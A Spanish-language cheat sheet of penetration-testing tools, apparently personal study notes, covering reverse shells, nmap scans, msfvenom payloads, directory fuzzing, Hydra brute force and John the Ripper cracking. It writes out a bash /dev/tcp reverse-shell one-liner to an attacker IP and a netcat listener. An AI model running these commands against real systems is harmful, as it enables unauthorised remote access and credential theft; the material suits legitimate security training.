# Herramientas de pentesting

## 0. Como obtener una *reverse shell*
Primero de todo hemos de ejecutar en nuestra terminal el siguiente comando (nos da una tty sin tratar)
```bash
nc -nlvp {puerto}
```

Este comando nos hara estar en escucha en el puerto que determinemos en espera de que la máquina víctima nos envie la reverse shell.

- Windows
	1. Descargamos netcat
	2. Ejecutamos:
```bash
./nc.exe {ip atacante} {puerto} -l cmd.exe
```

- Linux
	1. Ejecutamos:
```bash
bash -i >& /dev/tcp/{ip atacante}/{puerto} 0>&1	
```

Una vez obtenida la reverse shell, para poder manejar la terminal de una manera mas sencilla, hacemos el siguiente tratamiento:
```bash
script /dev/null -c bash
stty raw -echo; fg
reset xterm
export TERM=xterm
```
Así ya podemos interactuar desde una tty completamente interactiva. 

---

## 1. *arp-scan*

La herramienta *arp-scan* sirve para escanear toda la red (la que le indicamos, en este caso es solo la red local) para encontrar la @IP de la máquina víctima. El comando mas utilizado es:
```bash
arp-scan -I {iface} --localnet
```

Donde el parametro **iface** corresponde a la interfaz de red que deseemos.

---

## 2. *nmap*
La herramienta nmap sirve para hacer escaneos de puertos. Esta herramienta es muy versátil, y se pueden realizar muchos tipos de escaneos. Los más útiles son los siguientes
### 2.1. Enumeración de puertos
Un primer escaneo para enumerar los puertos abiertos (y poder utilizar la utilidad extractPorts para verlos y copiarlos en el clipboard)
```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn {@IP victim} -oG allPorts
```

A continuación explicamos cada parámetro:

1. **-p-** → escanea todos los puertos
2. **--open** → filtra solo los puertos abiertos
3. **sS** → aplica un escaneo con stelf scan (que es mas sigiloso porque no hace el 3 way handshake)
4. **--min-rate** 5000→ no queremos que vaya mas lento que 5000 paquetes por segundo
5. **-vvv** → triple verbose para que a medida que vaya encontrando puertos los vaya reportando por pantalla
6. **-n** → para que no haga resolución DNS y vaya mas rápido
7. **-Pn** → evita hacer un ping
8. **-oG** allPorts→ exporta el resultado en formato *grepeable* al fichero que le digamos (en este caso *allPorts*)

Gracias a que lo hemos exportado en un fichero en formato grepeable, podemos ejecutar una utilidad llamada *extractPorts* para obtener la información mas relevante:
```bash
extractPorts allPorts
```

### 2.2. Extracción de información de los puertos
Una vez ya tenemos los puertos listados, podemos realizar un segundo escaneo mas exhaustivo, mediante el siguiente comando
```bash
nmap -sCV -p{PUERTOS COPIADOS} {@IP víctima} -oN targeted
```

A continuación explicamos cada parámetro:

1. **-sCV** → el parametro *sC* hace que se ejecuten todos los scripts de escaneo de nmap, y el parametro *V* te incluye tambien la version de los puertos que corren.
2. **-p** → sirve para pasarle los puertos
3. **-oN targeted** → lo exporta en formato normal (tal y como se ve en la terminal) al archivo targeted


De esta manera, tenemos dos archivos. El primero es *allPorts* y es donde tenemos los puertos guardados en formato grepeable para poder ejecutar la utilidad *extractPorts*. El segundo fichero es el fichero *targeted* que esta guardado en formato normal para poder consultar en cualquier momento toda la información de los puertos mediante el comando:
```bash
cat -l ruby targeted
```

Estos escaneos son los mas básicos, ya que a medida que vayamos avanzando, igual interesa listar puertos cerrados, puertos filtrados...

---

## 3. Searchsploits
Esta herramienta es muy útil para buscar vulnerabilidades de servicios una vez hecho el escaneo, puesto que lista todos los exploits que encuentra en las bases de datos.
```bash
searchsploits {servicio y version}
```

A pesar de que esta herramienta muestra un repertorio de exploits, es tambien interesante buscar mas en internet (sobre todo en github).

---

## 4. Msfvenom
Esta herramienta se utiliza para generar payloads personalizados para una amplia variedad de sistemas operativos y arquitecturas. Para ello, lo primero que hay que hacer es listar los payloads, y filtrarlos mediante *grep* con palabras clave. El comando para listar payloads es el siguiente
```bash
msfvenom -l
```

Una vez ya hemos encontrado el payload que nos interesa, para poder guardarnoslo en nuestra máquina hay que ejecutar el siguiente comando
```bash
msfvenom -p {payload} LHOST={@ip atacante} LPORT={puerto de escucha} -f {tipo de fichero} -o {filename.extension}
```

---

## 5. Nessus
Otra herramienta para hacer un escaneo y reportar vulnerabilidades es Nessus. Nessus es un servicio que corre en el puerto 8834 en nuestro ordenador (en el localhost) con el servicio HTTPS. Para poder utilizarlo, primero hay que iniciar el servicio mediante
```bash
systemctl start nessusd.service
```

Y una vez ya está corriendo, mediante un navegador web, debemos acceder a https://localhost:8834. Cuando nos encontramos ya dentro de nessus, para iniciar un nuevo escaneo hay que persionar el boton "New Scan" situado en la esquina superior derecha, lo que nos redirige a una página con una amplia selección de posibles escaneos. Los mas utilizados son
- Advanced Scan → es un escaneo lento, pero que reporta las posibles vulnerabilidades
- Host Discovery → escaneo muy básico (no es tan útil)

---

## 6. Burpsuite
Burpsuite es un proxy de interceptacion, que hace de intermediario entre una página web y el atacante, para poder gestionar manualmente los request y response. Para acceder se puede acceder desde el *rofi*, desde la terminal con el comando *"burpsuite"* o con el atajo "Super + shift + b" (en mi kali linux al menos).

---

## 7. Gobuster
Gobuster es una herramienta que permite enumerar directorios en una web mediante un diccionario. A este ataque se le llama FUZZING, y es útil sobre todo para recopilar información. El comando mas utilizado es el siguiente:
```bash
gobuster dir -w {diccionario} -u {URL} -t {numero de threads} -x {extensiones}
```

- Diccionario → diccionario que se utilizará para hacer el fuzzing. Los mas comunes son:
	- */usr/share/wordlists/dirb/common.txt*
	- */usr/share/wordlsists/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt*
- URL → la url sobre la que se realizará el ataque. Por ejemplo http://{ip victima}
- Numero de threads → numero de threads utilizados en el ataque (para que vaya mas rápido). Por ejemplo 20
- Extensiones → extensiones que pueden tener los directorios (html,php,txt,php.bak). Para esto es mejor usar el diccionario de SecLists

---

## 8. Hash-identifier + John The Ripper
Estas dos herramientas se suelen utilizar en conjunto, ya que la primera, *hash-identifier* sirve para identificar el tipo de hash con el que esta encriptada una cadena y *John The Ripper* sirve para desencriptarla (para utilizarla es necesario pasarle por parámetro el tipo de hash). Los comandos son los siguientes:
```bash
hash-identifier
john --format=Raw-{Tipo hash} --wordlist={diccionario} {fichero con el hash}
```

El diccionario por excelencia es *"/usr/share/wordlists/rockyout.txt"*.

---

## 9. Hydra
Hydra es una herramienta para ejecutar ataques de fuerza bruta. Para este ataque es necesario saber el servicio al que se va a intentar hacer el ataque (FTP, SSH, HTTP...) y es recomendable saber una de las dos credenciales (o usuario o contraseña) ya que si no conocemos ninguna y ejecutamos el ataque de fuerza bruta con dos diccionarios puede llegar a tardar mucho. A continuacion ponemos los 3 casos mas comunes con FTP (para cambiar de servicio solo hay que cambiar ftp por el servicio que sea (ssh, http,...))
```bash
hydra -l {user} -P {diccionario} ftp://{ip víctima}
hydra -L {diccionario} -p {password} ftp://{ip víctima}
hydra -L {diccionario} -P {diccionario} ftp://{ip víctima} (esta es mejor no hacerla, tarda mucho)
```

---

# 10. Wfuzz
Herramienta que sirve para enumerar subdominios de una web. El comando que se utiliza es el siguiente:
```bash
wfuzz -c --nc 400 -t 200 -w <diccionario> -v <dominio> -H "HOST: FUZZ.<dominio>"
```

De esta manera, el comando *wfuzz* busca subdominios cambiando la palabra *FUZZ* por los subdominios del diccionario.

---

# 11. Base64

Esto es muy útil y sale mucho (se utiliza mucho). Para decodificar cadenas en base64 ejecutamos el siguiente comando:
```bash
echo "cadena_base64" | base64 --decode
```
Para codificar en base64, se ejecuta lo siguiente:
```bash
echo "texto" | base64
```

---

# 12. WhatWeb
Herramienta de código abierto diseñada para identificar las tecnologías utilizadas en sitios web. WhatWeb puede detectar sistemas de gestión de contenido (CMS), plataformas de blogs, paquetes de análisis estadístico, bibliotecas de JavaScript, servidores web y dispositivos embebidos. Además, es capaz de identificar números de versión, direcciones de correo electrónico, identificadores de cuentas, módulos de frameworks web, errores SQL y más. El comando utilizado es el siguiente:

```bash
whatweb http://ejemplo.com
```